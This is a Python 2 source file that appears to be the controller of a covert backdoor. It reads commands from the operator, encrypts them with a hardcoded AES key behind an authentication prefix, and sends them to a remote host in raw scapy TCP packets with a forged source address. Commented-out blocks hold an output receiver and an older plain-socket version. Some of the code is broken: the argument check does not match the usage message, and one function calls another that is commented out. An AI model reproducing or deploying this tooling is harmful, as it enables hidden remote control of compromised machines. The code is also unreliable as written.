import socket
import sys
from scapy.all import *
from Crypto.Cipher import AES
from Crypto import Random

def usage():
    if len(sys.argv) != 2:
        print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
        sys.exit()

def stopfilter(pkt):
    global destIP
    src_ip = pkt[IP].src
    packet = pkt
    if src_ip == destIP:
        receiveOutput(packet)
    else:
        return False

def sendCommand():
    global destIP
    destIP = sys.argv[1]
    #destPort = sys.argv[2]
    #key to authenticating the packet
    authPacket = "Authenticate packets"
    #Encryption and decryption variables and initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)

    while True:
        #Prompt user for the command they want to send
        command = raw_input('Write your command: ')
        #Encrypt the command with AES encryption
        encryptedCommand = crypt.encrypt(authPacket + command)
        #Create the packet and store the command in the data field
        pkt = IP(src="192.168.0.14", dst=destIP)/TCP()/Raw(load=encryptedCommand)
        #Send the packet
        send(pkt)
        #sniff(count=1, filter="tcp", prn=recieveOutput, stopfilter=stopfilter)

# def receiveOutput(pkt):
#     global destIP
#     src_ip = pkt[IP].src
#     if src_ip == destIP:
#         #grab the raw data
#         data = pkt[Raw].load
#         #Decrypt the data
#         decryptedData = crypt.decrypt(data)
#         #if the decrypted data is authenticated, print it
#         if decryptedData.startswith(authPacket) == True:
#             newData = decryptedData[20:]
#             #Print the output
#             if newData == "exit":
#                 sys.exit()
#             else:
#                 print newData

if __name__ == "__main__":
    usage()
    sendCommand()












# #Connection Variables
# #Will change to commandline arguments
# HOST = "127.0.0.1"
# PORT = 8509

# #Open socket and connect to server
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))

# while True:
#   #User command input to be sent tot he server
#   command = raw_input('Write your command: ')
#   #Encrypt the command as well as the packet authenticator
#   encryptedCommand = crypt.encrypt(authPacket + command)
#   #Send encrypted command to the server
#   s.sendall(encryptedCommand)
#   #Receive the data from the server
#   data = s.recv(10240)
#   #Decrypt the data from the server
#   decryptedData = crypt.decrypt(data)
    # if decryptedData.startswith(authPacket) == True:
    #   newData = decryptedData[20:]
    #   #Print the output
    #   if newData == "exit":
    #       sys.exit()
    #   else:
    #       print newData
